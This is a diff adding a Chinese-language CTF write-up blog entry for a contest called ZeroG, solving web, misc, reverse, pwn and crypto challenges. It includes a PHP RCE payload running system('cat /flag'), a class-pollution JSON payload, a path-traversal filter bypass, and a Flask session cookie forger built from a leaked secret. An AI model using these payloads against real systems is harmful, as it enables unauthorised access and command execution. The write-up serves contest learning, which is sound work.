@@ -8383,4 +8383,164 @@ if(isset($file) &amp;&amp; strtolower(substr($file, -4)) &#x3D;&#x3D; “.jpg”
         <tag>PHP</tag>
       </tags>
   </entry>
+  <entry>
+    <title>ZeroG新神赛WP</title>
+    <url>/2026/10/30/2026-10-30-ZeroG%E6%96%B0%E7%A5%9E%E8%B5%9BWP/</url>
+    <content><![CDATA[<h3 id="ZeroG新神赛WP"><a href="#ZeroG新神赛WP" class="headerlink" title="ZeroG新神赛WP"></a>ZeroG新神赛WP</h3><p>最近比较忙，这比赛连打好几天，最高第四，结束后总排名第九，混了个三等奖</p>
+<p>一共写了18道题，现在开始补wp</p>
+<p>【Stage1—米米的奇幻之旅】</p>
+<p><img src="/images/zerog-2026-wp/image-20261030182632669.png" alt="image-20261030182632669"></p>
+<p>这题非常基础，firefox秒了</p>
+<p>第一关get请求，第二关有一个基础的字符串替换作为过滤，没什么用 修改参数为 fflaglag即可</p>
+<p>第三关</p>
+<p><img src="/images/zerog-2026-wp/image-20261030182834827.png" alt="image-20261030182834827"></p>
+<p><img src="/images/zerog-2026-wp/image-20261030182903862.png" alt="image-20261030182903862"></p>
+<p>右键重发请求后</p>
+<p>X-Forwarded-For 修改这个头即可</p>
+<p>….</p>
+<p><img src="/images/zerog-2026-wp/image-20261030183241057.png" alt="image-20261030183241057"></p>
+<p>反正最后firefox 一把梭 （最爱火狐 可惜性能不行 现在只有CTF用了）</p>
+<h4 id="Stage1-Orbital-Suply"><a href="#Stage1-Orbital-Suply" class="headerlink" title="Stage1 - Orbital Suply"></a>Stage1 - Orbital Suply</h4><p><img src="/images/zerog-2026-wp/image-20261030183326050.png" alt="image-20261030183326050"></p>
+<p>这道题第一反应是sql注入 ，我用wappalyzer看了一下技术栈，发现后端是Python flask，果断测试SSTI注入。</p>
+<p><img src="/images/zerog-2026-wp/image-20261026175118165.png" alt="image-20261026175118165"></p>
+<p>最后从环境变量中读到flag</p>
+<h4 id="StrangeJPG"><a href="#StrangeJPG" class="headerlink" title="StrangeJPG"></a>StrangeJPG</h4><p><img src="/images/zerog-2026-wp/image-20261030183905553.png" alt="image-20261030183905553"></p>
+<p>这题是MISC，binwalk或者foremost 分离出来有一本龙族（出题人夹带私货）和一个base64编码</p>
+<p>解码后拿到flag</p>
+<h4 id="Stage1—你胆子真是肥嘟嘟的"><a href="#Stage1—你胆子真是肥嘟嘟的" class="headerlink" title="Stage1—你胆子真是肥嘟嘟的"></a>Stage1—你胆子真是肥嘟嘟的</h4><p><img src="/images/zerog-2026-wp/image-20261030184148727.png" alt="image-20261030184148727"></p>
+<p>点击按钮访问路由：<code>/admin</code></p>
+<p>json编辑器这里</p>
+<p>利用链：$user-&gt;<strong>class</strong>-&gt;is_admin &#x3D;&#x3D;&#x3D; true</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__class__&quot;</span><span class="punctuation">:</span></span><br><span class="line"> <span class="punctuation">&#123;</span></span><br><span class="line">     <span class="attr">&quot;is_admin&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line"> <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>比赛后复盘发现考点是递归合并键问题，用户输入顺进了共享的类级状态</p>
+<p>污染成功后顺利进入admin得到flag</p>
+<h4 id="Stage1-—-NmapLog"><a href="#Stage1-—-NmapLog" class="headerlink" title="Stage1 — NmapLog"></a>Stage1 — NmapLog</h4><p><img src="/images/zerog-2026-wp/image-20261030195705495.png" alt="image-20261030195705495"></p>
+<p>直接wireshark打开</p>
+<p><img src="/images/zerog-2026-wp/image-20261030195821561.png" alt="image-20261030195821561"></p>
+<p>打开看包，大部分都是192.168.1.100向10.0.0.50发的</p>
+<p>后续扫描发送RST 未完成握手判断</p>
+<p>判断扫描方式为namp的半开扫描 <code>-sS</code> 因此tcp握手不会全握，卡在第二步</p>
+<p>过滤语句<code>tcp.flags.syn == 1 &amp;&amp; tcp.flags.ack==1</code></p>
+<p>原因：</p>
+<ul>
+<li><p><code>tcp.flags.syn == 1</code>：SYN 标志位置位，表示同步序列号。</p>
+</li>
+<li><p><code>tcp.flags.ack == 1</code>：ACK 标志位置位，表示确认号有效</p>
+</li>
+</ul>
+<p>因此，过滤出了这种包：服务端 → 客户端：**<code>SYN, ACK</code>，回应连接请求。← 过滤出的通常是这种包**</p>
+<p>最后得到flag</p>
+<p>ZeroGflag{192.168.1.100_10.0.0.50_22_80_443_sS}</p>
+<h3 id="Stage2—碰星喵的奇妙冒险"><a href="#Stage2—碰星喵的奇妙冒险" class="headerlink" title="Stage2—碰星喵的奇妙冒险"></a>Stage2—碰星喵的奇妙冒险</h3><p>解压！</p>
+<p><img src="/images/zerog-2026-wp/image-20261030201913735.png" alt="image-20261030201913735"></p>
+<p>一路下去</p>
+<p><img src="/images/zerog-2026-wp/image-20261030202214580.png" alt="image-20261030202214580"></p>
+<p>发现base64后的二进制数据</p>
+<p>可以看到无敌的我当时写了个python脚本</p>
+<p><img src="/images/zerog-2026-wp/image-20261030202341579.png" alt="image-20261030202341579"></p>
+<p>但是压缩包是损坏的！有额外数据段损坏，题目也提示了</p>
+<p>这里我投机取巧找了个在线网站</p>
+<p><img src="/images/zerog-2026-wp/image-20261030202440834.png" alt="image-20261030202440834"></p>
+<p>修完了解压就拿到flag了</p>
+<h4 id="Stage2-夜班值守"><a href="#Stage2-夜班值守" class="headerlink" title="Stage2-夜班值守"></a>Stage2-夜班值守</h4><p>进去之后下载题目，原网页有提示，这里懒得截了</p>
+<p><img src="/images/zerog-2026-wp/image-20261030203512012.png" alt="image-20261030203512012"></p>
+<p><code>access.log</code></p>
+<p>总之使用我强大的python脚本编写技术秒了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;access.log&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read()</span><br><span class="line"><span class="built_in">print</span>(content)</span><br><span class="line">a = content.split(<span class="string">&quot;frame&quot;</span>)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(i[<span class="number">1</span>:<span class="number">2</span>])</span><br><span class="line">    flag+=i[<span class="number">1</span>:<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">flag_len = <span class="built_in">len</span>(flag) -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> flag_len &gt;<span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(flag[flag_len],end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    flag_len -= <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>注意一点就是 存在没用的首字符 我写的代码的问题 手工丢弃后即可拿到flag</p>
+<h4 id="Stage2-ZeroG-2026"><a href="#Stage2-ZeroG-2026" class="headerlink" title="Stage2-ZeroG_2026"></a>Stage2-ZeroG_2026</h4><p>这题一打开我就发现，和极客大挑战2023_easy_php 好像啊，然后我就去看原题wp了</p>
+<p><img src="/images/zerog-2026-wp/image-20261030204020948.png" alt="image-20261030204020948"></p>
+<p>虽说如此，还是被卡了许久，太久没打ctf导致的</p>
+<p><img src="/images/zerog-2026-wp/image-20261030203858339.png" alt="image-20261030203858339"></p>
+<p>这题payload找不到了，我先复现下</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /?zero=ZeroG%202026!%0A&amp;xp=1e9 HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Welcome[_ctf.2026=240610708&amp;Welcome[_ctf_2026=240610708&amp;mm=QNKCDZO&amp;code=system(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>一共三关</p>
+<p>| 1    | <code>zero=ZeroG%202026!%0A</code>                      | PCRE 的 <code>$</code>（无 <code>D</code> 修饰符）匹配<strong>结尾换行之前</strong>的位置，所以 <code>&quot;ZeroG 2026!\n&quot;</code> 能被正则命中，但 <code>!== &#39;ZeroG 2026!&#39;</code> 成立（多了一个 <code>\n</code>） |
+| —- | ——————————————– | ———————————————————— |
+| 2    | <code>xp=1e9</code>                                     | <code>intval(&quot;1e9&quot;)</code> 只取整数前缀 &#x3D; <code>1</code>（&lt; 2026），而 <code>&quot;1e9&quot; + 4</code> 按科学计数法算 &#x3D; <code>1000000004</code>（&gt; 2030） |
+| 3    | <code>Welcome[_ctf.2026=240610708</code> + <code>mm=QNKCDZO</code> | MD5 魔术哈希，两个 <code>0e</code> 纯数字串松散比较相等；<code>$a !== $b</code> 成立因为明文不同 |</p>
+<p>印象里比较深的就是 [ 会被解析为[ 然后什么会被解析成.我忘了，等题目复现了，和本地复现情况不太一样</p>
+<p>大致和极客大挑战的大差不差。</p>
+<h4 id="Stage2一史迪仔的文件预览器"><a href="#Stage2一史迪仔的文件预览器" class="headerlink" title="Stage2一史迪仔的文件预览器"></a>Stage2一史迪仔的文件预览器</h4><p><img src="/images/zerog-2026-wp/image-20261030210200319.png" alt="image-20261030210200319"></p>
+<p><img src="/images/zerog-2026-wp/image-20261030210207961.png" alt="image-20261030210207961"></p>
+<p>这题目一眼目录跨越，但是还是试了很久</p>
+<p><img src="/images/zerog-2026-wp/image-20261030210302868.png" alt="image-20261030210302868"></p>
+<p><img src="/images/zerog-2026-wp/image-20261030210315767.png" alt="image-20261030210315767"></p>
+<p>通过原代码和URL收集到几个关键信息</p>
+<p>试过伪协议，还有普通的文件跨越都不行<code>../../../../</code></p>
+<p><img src="/images/zerog-2026-wp/image-20261030210433345.png" alt="image-20261030210433345"></p>
+<p>测试发现是单趟字符串替换，过滤器大概模样是：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/zerog-2026-wp/image-20261030210735410.png" alt="image-20261030210735410"></p>
+<p>根据这个也是成功读到了源码</p>
+<p><img src="/images/zerog-2026-wp/image-20261030210815596.png" alt="image-20261030210815596"></p>
+<p>后面想起来读这个文件，找到了flag的位置</p>
+<p><img src="/images/zerog-2026-wp/image-20261030210905447.png" alt="image-20261030210905447"></p>
+<h3 id="Pwn01-—-胖！什么是胖？"><a href="#Pwn01-—-胖！什么是胖？" class="headerlink" title="Pwn01 — 胖！什么是胖？"></a>Pwn01 — 胖！什么是胖？</h3><p>课业繁忙，出于时间原因 pwn只做了两道，下次比赛务必努力</p>
+<p>这道题纯签到，没什么好说的</p>
+<p><img src="/images/zerog-2026-wp/image-20261030211211109.png" alt="image-20261030211211109"></p>
+<h4 id="Stage1-—-FlaskLogin"><a href="#Stage1-—-FlaskLogin" class="headerlink" title="Stage1 — FlaskLogin"></a>Stage1 — FlaskLogin</h4><p><img src="/images/zerog-2026-wp/image-20261030211939916.png" alt="image-20261030211939916"></p>
+<p>这题目先直接通过首页给的账户密码登录</p>
+<p>然后注意这个🔑ctf2026 这个就是secret</p>
+<p>Flask 会话签名是<strong>双层 HMAC</strong>——先用 <code>SECRET_KEY</code> 派生出签名密钥</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64, hashlib, hmac, json, time, struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64e</span>(<span class="params">b</span>): <span class="keyword">return</span> base64.urlsafe_b64encode(b).rstrip(<span class="string">b&quot;=&quot;</span>)</span><br><span class="line"></span><br><span class="line">secret = <span class="string">b&quot;ctf2026&quot;</span></span><br><span class="line">key = hmac.new(secret, <span class="string">b&quot;cookie-session&quot;</span>, hashlib.sha1).digest()</span><br><span class="line"></span><br><span class="line">payload = b64e(json.dumps(&#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;, separators=(<span class="string">&quot;,&quot;</span>, <span class="string">&quot;:&quot;</span>)).encode())</span><br><span class="line">ts  = b64e(struct.pack(<span class="string">&quot;&gt;q&quot;</span>, <span class="built_in">int</span>(time.time())).lstrip(<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">sig = b64e(hmac.new(key, payload + <span class="string">b&quot;.&quot;</span> + ts, hashlib.sha1).digest())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&quot;.&quot;</span>.join([payload, ts, sig]).decode())</span><br></pre></td></tr></table></figure>
+
+<p>验签通过后得到flag</p>
+<p>flag{fl4sk_s3ss10n_1s_n07_s3cur3}</p>
+<h4 id="RE07-—-诶，捡到了一部野生手机耶"><a href="#RE07-—-诶，捡到了一部野生手机耶" class="headerlink" title="RE07 — 诶，捡到了一部野生手机耶"></a>RE07 — 诶，捡到了一部野生手机耶</h4><p>这题直接拿到一血，证明实力</p>
+<p>安装apk发现有个秘密频道</p>
+<p><img src="/images/zerog-2026-wp/6d7370e51d733395b2c3d930b20d7812.jpg" alt="6d7370e51d733395b2c3d930b20d7812"></p>
+<p><img src="/images/zerog-2026-wp/cea517d492d98499caba75f24cb7696f.jpg" alt="cea517d492d98499caba75f24cb7696f"></p>
+<p>解锁这个页面</p>
+<p>尊贵的MT管理器会员直接去改smali</p>
+<p><img src="/images/zerog-2026-wp/9690df48d1b016383fd305dd922bad99.jpg" alt="9690df48d1b016383fd305dd922bad99"></p>
+<p><img src="/images/zerog-2026-wp/f7523af213a092ef0d19c65e5fde1c79_720.jpg" alt="f7523af213a092ef0d19c65e5fde1c79_720"></p>
+<p><img src="/images/zerog-2026-wp/7e14d21075095f7381b4b1c5e9e5883c.jpg" alt="7e14d21075095f7381b4b1c5e9e5883c"></p>
+<p><img src="/images/zerog-2026-wp/50ae32eb4a5ee438226e422af60d7431.jpg" alt="50ae32eb4a5ee438226e422af60d7431"></p>
+<p>直接写死返回true就行了，没什么难度</p>
+<h4 id="stage-3-幽灵提交-Ghost-Commit"><a href="#stage-3-幽灵提交-Ghost-Commit" class="headerlink" title="stage 3 幽灵提交 Ghost Commit"></a>stage 3 幽灵提交 Ghost Commit</h4><p>首先下载题目</p>
+<p><img src="/images/zerog-2026-wp/image-20261030221221248.png" alt="image-20261030221221248"></p>
+<p>在悬空提交这里找到一条记录 直接读取</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">git fsck</span><br><span class="line">git show <span class="literal">--stat</span> a014b621</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/zerog-2026-wp/image-20261030220529985.png" alt="image-20261030220529985"></p>
+<p>拿到密文</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YlBEViV+WFFfTgcJVQ1WVQ9RG1pSClIdDANTAE8BUQIBGA4AWwEFBV0FAAtaWUk=</span><br></pre></td></tr></table></figure>
+
+<p>也是给提示了，直接脚本还原即可</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">d = base64.b64decode(<span class="string">&quot;YlBEViV+WFFfTgcJVQ1WVQ9RG1pSClIdDANTAE8BUQIBGA4AWwEFBV0FAAtaWUk=&quot;</span>)</span><br><span class="line">k = <span class="string">b&quot;8569b840&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(c ^ k[i % <span class="number">8</span>] <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(d)).decode())</span><br></pre></td></tr></table></figure>
+
+<p>ZeroGFlag{1075be7d-c02f-46e9-9e29-899915e0628a}</p>
+<h4 id="Pwn02-—-ELF？这茂密能吃吗？"><a href="#Pwn02-—-ELF？这茂密能吃吗？" class="headerlink" title="Pwn02 — ELF？这茂密能吃吗？"></a>Pwn02 — ELF？这茂密能吃吗？</h4><p><img src="/images/zerog-2026-wp/image-20261030221850099.png" alt="image-20261030221850099"></p>
+<p>这题目更是跟着GUIDE宝宝级教程往后做就行了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">elf  = ELF(<span class="string">&quot;./chall&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">addr = elf.symbols[<span class="string">&quot;pwnstars_secret&quot;</span>]</span><br><span class="line">log.info(<span class="string">&quot;secret = %s&quot;</span>, <span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 1</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Address &gt; &quot;</span>, <span class="built_in">hex</span>(addr).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&quot;[Stage 2]&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 2</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Calculate:\n&quot;</span>)</span><br><span class="line">line = p.recvline().decode().strip()</span><br><span class="line"><span class="comment"># 唯一难点就是脚本不好写 但也就那样吧</span></span><br><span class="line">m = re.fullmatch(<span class="string">r&quot;\((\d+) \+ (\d+)\) \* (\d+)&quot;</span>, line)</span><br><span class="line"><span class="keyword">if</span> m:</span><br><span class="line">    a, b, c = <span class="built_in">map</span>(<span class="built_in">int</span>, m.groups()); answer = (a + b) * c</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    m = re.fullmatch(<span class="string">r&quot;\((\d+) \* (\d+)\) \+ (\d+)&quot;</span>, line)</span><br><span class="line">    <span class="keyword">if</span> m:</span><br><span class="line">        a, b, c = <span class="built_in">map</span>(<span class="built_in">int</span>, m.groups()); answer = a * b + c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        answer = <span class="built_in">sum</span>(<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> re.findall(<span class="string">r&quot;\d+&quot;</span>, line))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(answer).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&quot;[Stage 3]&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 3</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;try; &quot;</span>)</span><br><span class="line">line = p.recvline().decode().strip()</span><br><span class="line">magic1, magic2, x = [<span class="built_in">int</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> re.findall(<span class="string">r&quot;=\s*(\d+)&quot;</span>, line)]</span><br><span class="line">p.sendline(<span class="built_in">str</span>((x ^ magic1) + magic2).encode())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvall(timeout=<span class="number">3</span>).decode(errors=<span class="string">&quot;replace&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="Stage3—重生之我在零重力屋顶当“卷王”"><a href="#Stage3—重生之我在零重力屋顶当“卷王”" class="headerlink" title="Stage3—重生之我在零重力屋顶当“卷王”"></a>Stage3—重生之我在零重力屋顶当“卷王”</h4><p><img src="/images/zerog-2026-wp/image-20261030221259999.png" alt="image-20261030221259999"></p>
+<p><img src="/images/zerog-2026-wp/image-20261030221359478.png" alt="image-20261030221359478"></p>
+<p>这题目直接修改成绩 向api发包就能拿到flag</p>
+<p>游戏源码都是明文的，发包的成绩是base64 拦截发送即可</p>
+<h4 id="Stage1—小小的e"><a href="#Stage1—小小的e" class="headerlink" title="Stage1—小小的e"></a>Stage1—小小的e</h4><p>经典RSA</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># RSA 的加密公式是 c = me mod n。先看看 e 有多“小”。</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">0x839be6cdc4b88edff570dc7fd5f4329f0eb71dda4d1b145f1699162376d3f881cec57ed510444071cd7583e165d46d4db23f065c3d0c46e0f5df07b10586c976a5aa8ba3a228bf4c35adf3058bf78e07a172345f4bac31046231feb6cb1fb34e38221d11ff66bcafd151574e0d0dac6fd85255830447fd3bc30ace70c50f6b7621c7d69cbf7c964de18f3af27c529792e61a1efbe1d871ab882e93406098e4a7a68809b238c118ffc6041d7950b1f8f02cd036d0a9728473a971c8bafa9ffa8cb132222d746fb54ccb87221cbffb75d031b7fd81b0fdaabe4fc2feefe865dddd273b9bc2d73ae407e0d452e3b2c13e6d42c981dbf2ae83053d75f7be67fc94fb</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">0xb4570009905c5f2decb8e9d92692696620ffa970e6afaee23835683fd1505edaba7f83507f9102c37fb1bf5722681bed59ba107a080d61b3d8a502cca30263499804f38795385e2723a3ef0dc6b4fc3800755a3049f91996dcb75ffb43ec65ebbbba1a7ae6ba361aa5aaba458b1ce127ed6c38a97dbddad57520ac5ca89e15965</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">m, exact = gmpy2.iroot(c, e) <span class="comment"># 验证是否能开方</span></span><br><span class="line"><span class="keyword">if</span> exact:</span><br><span class="line">    m = <span class="built_in">int</span>(m)</span><br><span class="line">    <span class="built_in">print</span>(m.to_bytes((m.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, <span class="string">&quot;big&quot;</span>).decode())</span><br></pre></td></tr></table></figure>
+
+<h4 id="RE01-—-藏了，但没完全藏"><a href="#RE01-—-藏了，但没完全藏" class="headerlink" title="RE01 — 藏了，但没完全藏"></a>RE01 — 藏了，但没完全藏</h4><p>首先Hxd16进制查看文件拿到密文</p>
+<p><img src="/images/zerog-2026-wp/image-20261030225747751.png" alt="image-20261030225747751"></p>
+<p>然后发现是凯撒加密 但是注意数字也要位移</p>
+<p><img src="/images/zerog-2026-wp/image-20261030225330131.png" alt="image-20261030225330131"></p>
+<p><img src="/images/zerog-2026-wp/image-20261030230027647.png" alt="image-20261030230027647"></p>
+<h4 id="Stage2-—-MagicInvoker"><a href="#Stage2-—-MagicInvoker" class="headerlink" title="Stage2 — MagicInvoker"></a>Stage2 — MagicInvoker</h4><p>这题秒的太快了，录屏没录上，是不是PHP魔术方法+POP 链条执行</p>
+<p>想起来了，题目给了四个魔术方法，直接反序列化调用RCE读取flag就行</p>
+]]></content>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
 </search>
